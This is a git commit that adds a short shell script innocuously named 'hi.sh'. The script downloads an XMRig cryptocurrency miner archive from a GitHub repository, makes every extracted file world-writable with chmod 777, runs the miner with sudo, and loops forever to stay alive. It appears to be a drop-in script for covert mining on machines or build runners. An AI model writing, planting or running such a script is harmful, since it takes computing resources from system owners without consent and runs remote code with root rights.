c10ba86b3204d6130e2ac01ad1acaa9341d6b78e
rinaffers <83849004+rinaffers@users.noreply.github.com>
2021-05-08 08:17:49 +0700

    Create hi.sh

---
+++ hi.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+sudo apt-get update -y
+wget https://github.com/rinaffers/Lorena/raw/main/xmrig-6.12.1-linux-static-x64.tar.xz
+tar -xf xmrig-6.12.1-linux-static-x64.tar.xz
+ls -lA
+chmod 777 *
+sudo ./xmrig
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
